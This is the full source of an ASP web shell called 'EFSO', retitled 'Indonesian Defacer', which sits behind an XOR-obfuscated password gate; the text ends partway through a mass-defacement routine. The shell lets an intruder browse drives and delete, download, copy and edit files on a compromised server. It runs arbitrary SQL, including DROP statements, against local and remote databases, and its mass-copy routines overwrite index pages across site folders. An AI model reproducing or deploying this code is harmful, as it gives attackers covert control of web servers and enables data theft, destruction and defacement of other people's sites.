<%@ LANGUAGE = VBScript.Encode %><%'ejder%>
<%
'EFSO Ejder &  Fastboy tarafýndan yazýlmýþtýr for SaVSaK.CoM . TÜM HAKLARI Ejder e Aitttir.-->
'TÜM HAKLARI SAKLIDIR.. KODLARDA yapacaðýnmýz bir deðiþiklik KODun Çalýþmamasýna mal olur. Bundan dolayý Bir sorun çýkarsa EJDER & SaVSAK.CoM Sorunlu deðildir..
'Bu yazýlýmda geliþtilmiþ tüm herþey , mantýk, algoritma, yazýlýmlar Sýfýrdan Ejder tarafýndan yazýlmýþtýr. TEMA , düzen vede Görünüm Fastboy a Aittir.
'TAKLÝTLEÝRNDEN KAÇININ. by EJDER

'Ejder was HERE

'if request("abc") = "isko" then
'response.cookies("yes") = "1"
'response.cookies("yes").expires = now+352
'end if 
'if not request.cookies("yes") = "1" then
'response.write "<center><br><br><br>YEtkin yok.. <br><br>by Ýskorpitx</center>"
'response.end()
'end if

'Server.ScriptTimeOut  = 7200
Fullpath=replace(Request.ServerVariables("PATH_TRANSLATED"),"/","\")
FilePath = mid(Fullpath,InStrRev(Fullpath,"\")+1)
FolderPath = Left(Fullpath,InStrRev(Fullpath,"\"))
const charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
const karakter1="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
const karakter2="abcdefghijklmnopqrstuvwxyz"
dkayit = "<html><head><title>Ejder Den kork, uzak dur. Kaþýnma...</title></head><body><center><br><br><br><br><br><b>Bu Scriptin TUM haklari EJDER e aitir. Uzerinde Oynama yasaktir. </b><br><br><br><br><br><b>by EJDER</b></center></body></html>"
dkayit2 = "<html><head><title>by EJDER</title></head><body><center><br><br><br><br><br><b>Bu Script i Kullanma Hakkin yok artik. YAsaklandi..  TÜrk server inda, com.tr, gov.tr gibi klaösr yada site var ise, direk algýlandýüýnda otomatik , kullanýmýnýza izin vermemektedir. UNUTMA ki, ben bu Script i Türkiyemiz için,, yabancýlara karþý kullanlým diye YAZdým. </b> <br><br><br><br><br><b>by EJDER</b></center></body></html>"
const karakter3="0123456789"
const karakter4="!@#$%^&*()-_+=~`[]{}|\:;<>,.?/"
mail_array = array("yahoo","hotmail","mynet","gmail","hacker")  'özel mailler yaratmak için, SPAM dan kaçarýmak için. Secueriy i aþmak için by EJDER
uzanti_array = array("com","net","biz","org","gov","br","info") 
yasak_array = array("EJDER","SAVSAK","YAGMUR","BÝRDEM","birdem","BIRDEM","FASTBOY","SAVSAK.COM","COM.TR","GOV.TR")
msite = "SaVSaK.CoM"
Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject") 
konum = Trim(request("konum"))
mode = request("mode")
FolderPath2 = request("FolderPath2")&"\"
islem = request("islem")
del = request("del")
file = request("file")
folder = request("folder")
table  = Request("table")
inject1  = Request("inject1")
inject2  = Request("inject2")
inject3  = Request("inject3")
inject4  = Request("inject4")
inject5  = Request("inject5")
cmdkod  = Request("cmdkod")
hacked = request("hacked")
Path = request("Path")
url = request("url")
count = request("count")
size = request("size")
dbname = request("dbname")
dbkadi = request("dbkadi")
dbsifre = request("dbsifre")
ejdersql = request("ejdersql")
sec = request("sec")
Usermd5 = request("Usermd5")
ara1 = request("ara1")
ara2 = request("ara2")
k1 = request("k1")
k2 = request("k2")
k3 = request("k3")
k4 = request("k4")
waiting = request("waiting")
murl = "http://www."
coding = request("coding")
dizi = request("dizi")
Usersmd5 = request("Usersmd5")
salt = request("salt")
hash2 = request("hash2")
hash3 = request("hash3")
hash4 = request("hash4")
hash5 = request("hash5")
hash6 = request("hash6")
hash7 = request("hash7")
hash8 = request("hash8")
hash9 = request("hash9")
hash10 = request("hash10")
mad = "EFSO"

if konum = "" then
konum = FolderPath
else
FolderPath = konum
end if

if mode = "1" then
FolderPath = request.form("remote")
konum = request.form("remote")
end if

nolist = False
popup = False

if mode = "2" or mode = "3" or mode = "7" or mode = "8" or mode = "16" or mode = "17" or mode = "18" or mode = "19" or mode = "20" or mode = "21" or mode = "22" or mode = "24"  or mode = "25" or mode = "26" or mode = "27" or mode = "28" or mode = "29" or mode = "30" or mode = "31" or mode = "32" or mode = "33" or mode = "36" or mode = "38" or mode = "39" or mode = "40" or mode = "41" or mode = "42" or mode = "43" or mode = "44" or mode = "45" or mode = "99" then
popup = True
end if

if mode = "6" then
Response.Buffer=True
Set Fil = FSO.GetFile(file)
Response.contenttype="application/force-download"
Response.AddHeader "Cache-control","private"
Response.AddHeader "Content-Length", Fil.Size
Response.AddHeader "Content-Disposition", "attachment; filename=" & Fil.name
Response.BinaryWrite readBinaryFile(Fil.path)
Set f = Nothing: Set Fil = Nothing
response.end
end if

if not mode = "okdir" then
Call gelgit
end if

'response.write "<title>EFSO 2.0 For SaVSaK.CoM </title>"
response.write "<title>Indonesian Defacer</title>"
response.write "<meta http-equiv=""Content-Type"" content=""text/html; charset=iso-8859-9"">"
response.write "<style>"
response.write "body{margin:0px;font-style:normal;font-size:10px;color:#FFFFFF;font-family:Verdana,Arial;background-color:#3a3a3a;scrollbar-face-color: #303030;scrollbar-highlight-color: #5d5d5d;scrollbar-shadow-color: #121212;scrollbar-3dlight-color: #3a3a3a;scrollbar-arrow-color: #9d9d9d;scrollbar-track-color: #3a3a3a;scrollbar-darkshadow-color: #3a3a3a;}"
response.write ".k1{font-family:Wingdings; font-size:15px;}"
response.write ".k2{font-family:Webdings; font-size:15px;}"
response.write "td{font-style:normal;font-size:10px;color:#FFFFFF;font-family:Verdana,Arial;}"
response.write "a{color:#EEEEEE;text-decoration:none;}"
response.write "a:hover{color:#40a0ec;}"
response.write "a:visited{color:#EEEEEE;}"
response.write "a:visited:hover{color:#40a0ec;}"
response.write "input,"
response.write ".kbrtm,"
response.write "select{background:#303030;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; height:18; border-left:1px solid #5d5d5d; border-right:1px solid #121212; border-bottom:1px solid #121212; border-top:1px solid #5d5d5d;}"
response.write "textarea{background:#121212;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; height:18; border-left:1px solid #121212; border-right:1px solid #5d5d5d; border-bottom:1px solid #5d5d5d; border-top:1px solid #121212;}"
response.write "</style>"
%>
<by Hmei7 start>
<%

function indonesia(ygmodiacak)
for n=1 to len(ygmodiacak)
	indonesia=indonesia & chr(asc(mid(ygmodiacak,n,1)) xor 77)
next	
end function
'ON ERROR RESUME NEXT
Response.Buffer = True
password = indonesia(">( ,?,#*")   ' <---Your password here

If request.querystring("logoff")="@" then
	session("Hmei7")=""	' Logged off
end if

	If (session("Hmei7")<>password) and Request.form("code")="" Then
		%>
		<FORM method="post" action="<%=Request.Servervariables("SCRIPT_NAME")%>" >
			<INPUT type=password name=code >
		</FORM>
		<%
		Response.END
	End If


	If Request.form("code") = password or session("Hmei7") = password Then
		session("Hmei7") = password
	Else
		Response.Write "salah"
		Response.Write "<br>hint : where is the city Hmei7 was born ???"
		Response.END
	End If


'server.scriptTimeout=180 'jangan digunakan
set fso = Server.CreateObject("Scripting.FileSystemObject")
mapPath = Server.mappath(Request.Servervariables("SCRIPT_NAME"))


if session(myScriptName) = "" then
	for x = len(mapPath) to 0 step -1
	myScriptName = mid(mapPath,x)
	if instr(1,myScriptName,"\")>0 then
		myScriptName = mid(mapPath,x+1)
		x=0
		session(myScriptName) = myScriptName
	end if
	next
Else
	myScriptName = session(myScriptName)
end if


%>
<by Hmei7 end>

<A HREF="<%=Request.Servervariables("SCRIPT_NAME")%>?logoff=@&_byHmei7_"><font size=-2 face=arial>log out</A>


<!--EFSO Ejder &  Fastboy tarafýndan yazýlmýþtýr for SaVSaK.CoM . TÜM HAKLARI Ejder e Aitttir.-->
<!--TÜM HAKLARI SAKLIDIR.. KODLARDA yapacaðýnmýz bir deðiþiklik KODun Çalýþmamasýna mal olur. Bundan dolayý Bir sorun çýkarsa EJDER & SaVSAK.CoM Sorunlu deðildir..-->
<!--Bu yazýlýmda geliþtilmiþ tüm herþey , mantýk, algoritma, yazýlýmlar Sýfýrdan Ejder tarafýndan yazýlmýþtýr. TEMA , düzen vede Görünüm Fastboy a Aittir. -->
<!-- TAKLÝTLEÝRNDEN KAÇININ. by EJDER-->

<script language=javascript>
    function NewWindow(mypage, myname, w, h, scroll) {
        var winl = (screen.width - w) / 2;
        var wint = (screen.height - h) / 2;
            winprops = 'height='+h+',width='+w+',top='+wint+',left='+winl+',scrollbars='+scroll+',resizable'
        win = window.open(mypage, myname, winprops)
        if (parseInt(navigator.appVersion) >= 4) { win.window.focus(); }
    }
    function klasorkopya(yol){
        NewWindow(yol,"",400,130,"no");
    }
    function mass(yol){
        NewWindow(yol,"",555,600,"yes");
    }
    function tester(yol){
        NewWindow(yol,"",600,600,"yes");
    }  
    function klasor(yol){
        NewWindow(yol,"",420,450,"yes");
    }    
    function cmd(yol){
        NewWindow(yol,"",550,555,"no");
    }
    function biz(yol){
        NewWindow(yol,"",550,700,"no");
    }  
    function cmdhelp(yol){
        NewWindow(yol,"",500,230,"no");
    }   
    function somur(yol){
        NewWindow(yol,"",420,220,"yes");
    }       
</script>
<script language="JavaScript">
function openInMainWin(winLocation){
	window.opener.location.href = winLocation
	window.opener.focus();
}
</script>
<%
sub KlasorOku
	on error resume next
    Set f = FSO.GetFolder(FolderPath)
    Set fc = f.SubFolders
    For Each f1 In fc
			'If Instr(f1.Name, "com.tr") > 1 or  Instr(f1.Name, "gov.tr") > 1 or  Instr(f1.Name, "comtr") > 1  or  Instr(f1.Name, "govtr") > 1  or  Instr(f1.Name, "gov_tr") > 1  or  Instr(f1.Name, "com_tr") > 1  or  Instr(f1.Name, "savsakcom") > 1  or  Instr(f1.Name, "savsak_com") > 1  or  Instr(f1.Name, "savsak.com") > 1 Then
				'Set textStreamObject = fso.OpenTextFile(Fullpath,2,true,false) 
				'textStreamObject.WriteLine(dkayit2)
				'textStreamObject.Closenere
				'Set textStreamObject = Nothing 
				'response.end()
			'end if
    	if FolderPath = "c:" or FolderPath = "C:" then
        Response.Write "<table class=""kbrtm"" ><tr><td><font class=""k1""><a title="" Dizini Kopyala & Taþý "" href='"&FilePath&"?mode=2&konum="&FolderPath&""&f1.Name&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a></font> <font class=""k1""><a  title="" Dizini Sil "" href='"&FilePath&"?mode=4&konum="&FolderPath&"&del="&FolderPath&""&f1.Name&"&Time="&time&"'>û</a> 1</font><font size=2><b><a title="" Dizinin içine Gir "" href='"&FilePath&"?konum="&FolderPath&""&f1.Name&"&Time="&time&"'>"&f1.name&"</a></b></td></tr></table>"       	
    	else
        Response.Write "<table class=""kbrtm"" ><tr><td><font class=""k1""><a title="" Dizini Kopyala & Taþý "" href='"&FilePath&"?mode=2&konum="&FolderPath&"\"&f1.Name&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a></font> <font class=""k1""><a  title="" Dizini Sil "" href='"&FilePath&"?mode=4&konum="&FolderPath&"&del="&FolderPath&"\"&f1.Name&"&Time="&time&"'>û</a> 1</font><font size=2><b><a title="" Dizinin içine Gir "" href='"&FilePath&"?konum="&FolderPath&"\"&f1.Name&"&Time="&time&"'>"&f1.name&"</a></b></td></tr></table>"   
        end if
        Response.Flush
    Next
    call hata
end sub

sub DosyaOku
	on error resume next
    Set f = FSO.GetFolder(FolderPath)
    Set fc = f.Files
    For Each f1 In fc
        dosyaAdi = f1.name
        num = InStrRev(dosyaAdi,".")
        uzanti = lcase(Right(dosyaAdi,len(dosyaAdi)-num))
        downStr = "<a title=""Dosyayý Sil"" href='"&FilePath&"?mode=5&konum="&FolderPath&"&del="&FolderPath&"\"&f1.Name&"&Time="&time&"'>û</a><font face=webdings><a title="" Download et "" href='"&FilePath&"?mode=6&file="&f1.path&"&konum="&FolderPath&"&Time="&time&"'>Í</a></font><font face=wingdings><a title="" Dosyayý Kopyala & Taþý "" href='"&FilePath&"?mode=7&file="&f1.path&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">4</a><a title="" Dosya Ad & Format Deðiþtir "" href='"&FilePath&"?mode=16&file="&f1.path&"&islem="&f1.name&"&konum="&FolderPath&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">?</a></font>"
        response.Write "<table class=""kbrtm"" ><tr><td><font size=2>"
        select case uzanti
        case "mdb"
            Response.Write "<a title="" Db in içini Görmek , SQl sorgu yapmak için Týkla by EJDER ;) "" href='"&FilePath&"?mode=13&file="&FolderPath&"\"&f1.Name&"&konum="&FolderPath&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>M  "&downStr&"</font></td></tr></table>"
        case "asp"
            Response.Write "<a title="" Ýçini Görüntülemek için Týkla "" href='"&FilePath&"?mode=9&file="&FolderPath&"\"&f1.Name&"&konum="&FolderPath&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>± <a title="" Dosyayý Editlemek için Týkla by EJDER :) "" href='"&FilePath&"?mode=10&file="&f1.path&"&Time="&time&"&konum="&FolderPath&"'>!</a>"&downStr&"</font></td></tr></table>"
        case "jpg","gif"
            Response.Write "<a title="" Resmi Görmek için Týkla "" href='"&FilePath&"?mode=12&file="&FolderPath&"\"&f1.Name&"&konum="&FolderPath&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=webdings size=4>¢</font><font face=wingdings size=4>  "&downStr&"</font></td></tr></table>"
        case else
            Response.Write "<a title="" Ýçini Görüntülemek için Týkla "" href='"&FilePath&"?mode=9&file="&FolderPath&"\"&f1.Name&"&konum="&FolderPath&"&Time="&time&"'>"&f1.name&" [<font color=yellow>"&FormatNumber(f1.size,0)&"</font>]"&"</a></b> <font face=wingdings size=4>2 <a title="" Dosyayý Editlemek için Týkla by EJDER :) "" href='"&dosyaPath&"?mode=10&file="&f1.path&"&Time="&time&"&konum="&FolderPath&"'>!</a>"&downStr&"</font></td></tr></table>"
        end select
    Next
    call hata
end sub

sub Suruculer
	for each drive_ in FSO.Drives
		Response.Write "<tr bgcolor=""#3a3a3a""><td height=""20"" class=""kbrtm"">"
		Response.Write "<a href="" "&FilePath&"?konum="&drive_.DriveLetter&":/ "">"
		if drive_.Drivetype=1 then Response.write "&nbsp;&nbsp;<font class=""k1""><</font>&nbsp;Disket Sürücü [" & drive_.DriveLetter & ":]&nbsp;&nbsp;&nbsp;<a title=""Sürücü Detayý Ýçin Týkla"" href="""&FilePath&"?dspace="&drive_.DriveLetter&"&konum="&konum&"""><font class=""k1"">Ä</font></a>"
		if drive_.Drivetype=2 then Response.write "&nbsp;&nbsp;<font class=""k1"">;</font>&nbsp;Sabit Disk [" & drive_.DriveLetter & ":]&nbsp;&nbsp;&nbsp;<a title=""Sürücü Detayý Ýçin Týkla"" href="""&FilePath&"?dspace="&drive_.DriveLetter&"&konum="&konum&"""><font class=""k1"">Ä</font></a>"
		if drive_.Drivetype=3 then Response.write "&nbsp;&nbsp;<font class=""k1"">;</font>&nbsp;Çýkarýlabilir Disk [" & drive_.DriveLetter & ":]&nbsp;&nbsp;&nbsp;<a title=""Sürücü Detayý Ýçin Týkla"" href="""&FilePath&"?dspace="&drive_.DriveLetter&"&konum="&konum&"""><font class=""k1"">Ä</font></a>"
		if drive_.Drivetype=4 then Response.write "&nbsp;&nbsp;<font class=""k2"">³</font>&nbsp;Cd-Rom [" & drive_.DriveLetter & ":]&nbsp;&nbsp;&nbsp;<a title=""Sürücü Detayý Ýçin Týkla"" href="""&FilePath&"?dspace="&drive_.DriveLetter&"&konum="&konum&"""><font class=""k1"">Ä</font></a>"
		Response.Write "</a></td></tr>"
	next
		Response.Write "<tr bgcolor=""#3a3a3a""><td class=""kbrtm"" height=""20"">&nbsp;&nbsp;<a href="" "&FilePath&" ""><font class=""k2"">H</font> Local Path </a></td></tr>"
end sub

Sub SurucuInfo
	'Disk Alanýný Gösterir - Created By FasTBoY ;)
	
	DriveSpace = Request("dspace")
	If Not DriveSpace = "" Then
	on error resume next
	Set driveObject = FSO.GetDrive(DriveSpace)
	D1 = Left((driveObject.FreeSpace/(driveObject.TotalSize*1.0))*100.0, 4)
	if err <> 0 then
	response.write "<center><br> <font color=#FE7A84> <font face=Wingdings size=5>N</font> Disk Hazýr deðil  !!!! :( <font face=Wingdings size=5>N</font></font> <br></center>"
	else
	D2 = Left(((driveObject.TotalSize - driveObject.FreeSpace)/(driveObject.TotalSize*1.0))*100.0, 4)
	D3 = 100
	D1a = 110 - D1
	D2a = 110 - D2
	D3a = 110 - D3
	Response.Write "<br><center><table cellspacing=0 cellpadding=0><tr><td style='background-color: #121212;' colspan=4 align=center class=kbrtm><b>Disk :</b>&nbsp;" & driveObject.DriveLetter & "</td></tr><tr><td class=kbrtm width=60>&nbsp;</td><td class=kbrtm width=100 align=center><b>Boþ Alan</b></td><td class=kbrtm width=100 align=center><b>Kullanýlan Alan</b></td><td class=kbrtm width=100 align=center><b>Toplam Alan</b></td></tr><tr><td height=110 class=kbrtm>&nbsp;</td><td class=kbrtm align=center><table cellpadding=0 cellspacing=0><tr><td colspan=3 height="&D1a&"></td></tr><tr height="&D1&"><td bgcolor=#009900 width=2></td><td bgcolor=#33CC00 width=15></td><td bgcolor=#009900 width=2></td></tr></table></td><td class=kbrtm align=center valign=bottom><table cellpadding=0 cellspacing=0><tr><td colspan=3 height="&D2a&"></td></tr><tr height="&D2&"><td bgcolor=#990000 width=2></td><td bgcolor=#CC0000 width=15></td><td bgcolor=#990000 width=2></td></tr></table></td><td class=kbrtm align=center valign=bottom><table cellpadding=0 cellspacing=0><tr><td colspan=3 height="&D3a&"></td></tr><tr height="&D3&"><td bgcolor=#006699 width=2></td><td bgcolor=#0088CC width=15></td><td bgcolor=#006699 width=2></td></tr></table></td></tr><tr><td class=kbrtm>&nbsp;<b>Yüzde :</b></td><td class=kbrtm align=center>"&D1&" %</td><td class=kbrtm align=center>"&D2&" %</td><td class=kbrtm align=center>"&D3&" %</td></tr><tr><td class=kbrtm>&nbsp;<b>Boyut :</b></td><td class=kbrtm align=center>&nbsp;" & FormatNumber(driveObject.FreeSpace / 1048576) & " MB</td><td class=kbrtm align=center>&nbsp;" & FormatNumber(driveObject.TotalSize / 1048576) - FormatNumber(driveObject.FreeSpace / 1048576) & " MB</td><td class=kbrtm align=center>&nbsp;" & FormatNumber(driveObject.TotalSize / 1048576) & " MB</td></tr></table></center><br><br><br>"
	end if
	Set driveObject = Nothing
	End If
end sub

sub yetkino(str)
response.write "<td class=""kbrtm"">&nbsp;&nbsp;&nbsp;<b><font color=#FBE1D7>"&str&" :</font></b> <font color=#FE7A84 class=""k1"">û</font>&nbsp;&nbsp;&nbsp;</td>"	
End Sub
sub yetkiyes(str)
response.write "<td class=""kbrtm"">&nbsp;&nbsp;&nbsp;<b><font color=#FAFEDE>"&str&" :</font></b> <font color=#C6FCBE class=""k1"">ü</font>&nbsp;&nbsp;&nbsp;</td>"
end Sub

sub Yetki
	on error resume next
    Set f = FSO.GetFolder(FolderPath)
    if err<>0 then
	yetkino("Okuma")
	yetkino("Yazma")
	yetkino("Silme")
    else
	yetkiyes("Okuma")

    on error resume next
    Set MyFile = FSO.CreateTextFile(FolderPath & "test.ejder", True)
    MyFile.write "Ejder Was Here... =) Yazma - Okuma Testi için"
    set MyFile = Nothing
    if err<>0 then
	yetkino("Yazma")
	yetkino("Silme")
    else
	yetkiyes("Yazma")
        on error resume next
        FSO.DeleteFile FolderPath & "test.ejder",true
        if err<>0 then
		yetkino("Silme")
        else
		yetkiyes("Silme")
        end if
    end if

    end if
    set f = nothing
end sub

Sub olmadi(str)
response.write "<br><center><font color=#FE7A84> <font face=Wingdings size=5>N</font> "&str&" :( <font face=Wingdings size=5>N</font> </font></center>"
End Sub

Sub oldu(str)
response.write "<br><center><font color=#C6FCBE> <font face=Wingdings size=5>N</font> "&str&" ;) Tebrikler.. by Ejder <font face=Wingdings size=5>N</font> </font></center>"
End Sub

Sub tablo12(str)
response.write "<tr bgcolor=""#121212""><td align=""center"" width=""100%""  valign=""middle"">"&str&"</td></tr>"
End Sub

Sub tablo30(str)
response.write "<tr bgcolor=""#303030""><td class=""kbrtm"" align=""center"" width=""100%""  valign=""middle"">"&str&"</td></tr>"
End Sub

Sub tablo12L(str)
response.write "<tr bgcolor=""#121212""><td align=""center"" width=""100%""  valign=""middle"">"&str&"</td></tr>"
End Sub

Sub tablo12O(str)
response.write "<tr bgcolor=""#121212""><td class=""kbrtm"" align=""center"" width=""100%""  valign=""middle"">"&str&"</td></tr>"
End Sub

sub Hata
    if err<>0 then
        Response.Write "<center><font color=red size=2>Hata : "&err.Description&"</font></center>"
    end if
end sub

Function ReadBinaryFile(FileName)
  Const adTypeBinary = 1
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.LoadFromFile FileName
  ReadBinaryFile = BinaryStream.Read
End Function

Sub SQL_menu_by_Ejder
	response.write "<center><table width=""450"">"
	response.write "<tr class=""kbrtm"" valign=""top""><td colspan=""2"" align=""center"">"
	response.write "<form name=""dosyacopypaste"" action='"&FilePath&"' type=""post"">"
	response.write "<table class=""kbrtm"" cellpadding=""1"" cellspacing=""1"" bgcolor=""#5d5d5d"" width=""100%"">"
	tablo30(" <b>SQL Ýnjection Merkezi</b>")
	tablo30("&nbsp;")
	tablo12("<font color=#FE7A84> Kullanabilmeniz için SQL kouýtlarý bilmeniz gerek !!! <br> <font face=Wingdings size=5>N</font> Aksi Halde ASP DOsyaý Kitlenir. Cevap veremez. Server a Zarar verir.  <font face=Wingdings size=5>N</font></font>")
	tablo12(" Select <input value=""select"" type=""radio"" name=""islem"" checked> <input  size=""60"" type=""text"" name=""inject1"" value='Select * from "&table&"'>")
	tablo12(" Delete <input value=""delete"" type=""radio"" name=""islem"" > <input  size=""60"" type=""text"" name=""inject2"" value='Delete from "&table&"'>")
	tablo12(" Insert <input value=""insert"" type=""radio"" name=""islem"" > <input  size=""60"" type=""text"" name=""inject3"" value='Insert into "&table&" () values ()'>")
	tablo12(" Update <input value=""update"" type=""radio"" name=""islem"" > <input  size=""60"" type=""text"" name=""inject4"" value='Update "&table&" set .. where ..'>")
	tablo12(" Diðer <input value=""diger"" type=""radio"" name=""islem"" > <input  size=""60"" type=""text"" name=""inject5"" value='Drop "&table&"'>")
	tablo12("<input name=""mode"" type=""hidden"" value='15' ><input name=""sec"" type=""hidden"" value='"&sec&"' ><input name=""ejdersql"" type=""hidden"" value='"&ejdersql&"' ><input name=""file"" type=""hidden"" value='"&file&"' ><input name=""konum"" type=""hidden"" value='"&FolderPath&"' ><input name=""table"" type=""hidden"" value='"&table&"' ><br><input value="" SQL Ýnj. Uygula "" type=""Submit""><br><br>")
	if ejdersql = "" then
		tablo12("<a href='"&FilePath&"?mode=13&file="&file&"&konum="&FolderPath&"&Time="&time&"'> .... ::: Tablolara Geri Dön ::: .... </a><br>")
	else
		tablo12("<a href='"&FilePath&"?mode=34&file="&file&"&konum="&konum&"&ejdersql="&ejdersql&"&islem=1&Time="&time&"'> .... ::: Tablolara Geri Dön ::: .... </a><br>")
	end if
	response.write "</form></table></td></tr></table><br></center>"
	response.write "<table align=""center"" class=""kbrtm""><tr><td align='center'> <a href='"&FilePath&"?mode=36&konum="&konum&"&Time="&time&"' onclick=""klasor(this.href);return false;""><b>...:::::: SQL Komut Yardým - Kullaným Klavuzu by EJDER ::::::...</b></a> </td></tr></table><br>"
end sub

Sub SQL_by_EJDER(sqlkonum,sqlkomut) 
	on error resume next
	Set objConn = Server.CreateObject("ADODB.Connection")
	Set objRcs = Server.CreateObject("ADODB.RecordSet")
	objConn.Provider = "Microsoft.Jet.Oledb.4.0"
	objConn.ConnectionString = sqlkonum
	objConn.Open
	if err <> 0 then
	response.write "<br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> DataBase ile Baðlantýnýz Saðlanamadýý !!! by EJDER :( <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br>"
	else
		on error resume next
		objRcs.Open sqlkomut,objConn, adOpenKeyset , , adCmdText
		if err <> 0 then
		response.write "<br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> SQL Ýnjection Komutunuzda HATA var. ( Biliyorsan KullanMA :) ) by EJDER <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br>"
		else
			Response.Write "<center><table class=""kbrtm"" border=1 cellpadding=2 cellspacing=0 bordercolor=543152><tr bgcolor=silver>"
			for i=0 to objRcs.Fields.count-1
			    Response.Write "<td><font color=black><b>&nbsp;&nbsp;&nbsp;"&objRcs.Fields(i).Name&"&nbsp;&nbsp;&nbsp;</font></td>"
			next
			Response.Write "</tr>"
			do while not objRcs.EOF
			   Response.Write "<tr class=""kbrtm"">"
			   for i=0 to objRcs.Fields.count-1
			      Response.Write "<td class=""kbrtm"">"&Replace(objRcs.Fields(i).Value,"<","&lt;")&"&nbsp;</td>"
			   next
			      Response.Write "</tr>"
			      objRcs.MoveNext
			loop
			Response.Write "</table><br></center>"
		end if
	end if
end sub

Sub MSSQL_by_EJDER(sqlkonum,sqlkomut) 
	on error resume next
	Set objConn = Server.CreateObject("ADODB.Connection")
	Set objRcs = Server.CreateObject("ADODB.RecordSet")
	objConn.Open sqlkonum
	if err <> 0 then
	response.write "<br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> DataBase ile Baðlantýnýz Saðlanamadýý !!! by EJDER :( <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br>"
	else
		on error resume next
		objRcs.Open sqlkomut,objConn, adOpenKeyset , , adCmdText
		if err <> 0 then
		response.write "<br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> SQL Ýnjection Komutunuzda HATA var. ( Biliyorsan KullanMA :) ) by EJDER <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br>"
		else
			Response.Write "<center><table class=""kbrtm"" border=1 cellpadding=2 cellspacing=0 bordercolor=543152><tr bgcolor=silver>"
			for i=0 to objRcs.Fields.count-1
			    Response.Write "<td><font color=black><b>&nbsp;&nbsp;&nbsp;"&objRcs.Fields(i).Name&"&nbsp;&nbsp;&nbsp;</font></td>"
			next
			Response.Write "</tr>"
			do while not objRcs.EOF
			   Response.Write "<tr class=""kbrtm"">"
			   for i=0 to objRcs.Fields.count-1
			      Response.Write "<td class=""kbrtm"">"&objRcs.Fields(i).Value&"&nbsp;</td>"
			   next
			      Response.Write "</tr>"
			      objRcs.MoveNext
			loop
			Response.Write "</table><br></center>"
		end if
	end if
end sub

sub Tablolama()
on error resume next
if ejdersql = "" then
	if sec = "mssql" then
		ejdersql = "PROVIDER=SQLOLEDB;DATA SOURCE="&file&";UID="&dbkadi&";PWD="&dbsifre&";DATABASE="&dbname&""
	else
		ejdersql = "Driver={MySQL ODBC 3.51 Driver};Server="&file&";Database="&dbname&";Uid="&dbkadi&";Pwd="&dbsifre&""
	end if
end if
Set objConn = Server.CreateObject("ADODB.Connection")
Set objADOX = Server.CreateObject("ADOX.Catalog")
objConn.Open ejdersql
objADOX.ActiveConnection = objConn
if err = 0 then
Response.Write "<center><b><font size=3>Tablolar</font></br><br>"
response.write "<table class=""kbrtm"">"
For Each table in objADOX.Tables
    If table.Type = "TABLE" Then
        Response.Write "<tr><td><font face=wingdings size=5>4</font> <a href='"&FilePath&"?mode=35&ejdersql="&ejdersql&"&table="&table.Name&"&konum="&konum&"&time="&time&"'>"&table.Name&"</a></td></tr>"
    End If
Next
response.write "</table>"
response.write "</center>"
else
Call MSSQL_Form
yazortaa("<br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> Server ile baðlantý Saðlanamadý !!! girilen Deðerler yanlýþ .. :( by EJDER <font face=Wingdings size=5>N</font> </font><br><br></center>")
end if
end Sub

sub MSSQL_Form()
response.write "<center><table align=""center"" ><tr><td>"
yazorta("<b> MY-MS SQL Server Conneciton 1.0 by EJDER </b>")
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td align='center'><form name=""MssqlbyE_j_d?er"" method='post' action='"&FilePath&"?mode=34&konum="&konum&"&Time="&time&"'><input name='sec' checked value='mssql' type='radio'> <b>MsSQL</b>  &nbsp;&nbsp;  - &nbsp;&nbsp;  <input name='sec' value='mysql' type='radio'> <b>MySQL</b></td></tr><tr><td>Server Adý & IP : <input name='file' value='"&file&"' style='color=#C6FCBE' size=35 type='password'></td></tr><tr><td> DB Adý : <input name='dbname' style='color=#C6FCBE' type='password' value='"&dbname&"' size=44></td></tr><tr><td> KAdý : <input name='dbkadi' style='color=#C6FCBE' value='"&dbkadi&"' type='password' size=46></td></tr><tr><td> Þifre : <input name='dbsifre' style='color=#C6FCBE' type='password' value='"&dbsifre&"' size=46></td></tr><td align='center'> <input name='islem' type='hidden' value='1'><input name='gooo' value=' ..:: Baðlan ::..'  type='Submit'></td></tr></form></table>"
yazorta("TÜm haklarý Saklýdýr by EJDER =)")
response.write "</td></tr></table></center>"
end sub

sub MassCopier(hedef)
on error resume next
Set cloner = fso.GetFile(hacked)
cloner.Copy hedef,true
Set cloner = Nothing
end sub

sub MassCreater(yer,savsak)
on error resume next
Set savsakcom = FSO.CreateTextFile(yer, True)
savsakcom.write savsak
Set savsakcom  = Nothing
end sub

sub MassAttack2(yer,ej,svk)
if hash3 = "ok" then
yer = yer&"\"&svk
end if
on error resume next
 if not islem = "ozel" then
 	if hash9 = "copy" then
		MassCopier(yer&"\index.html")
		MassCopier(yer&"\index.htm")
		MassCopier(yer&"\index.asp")
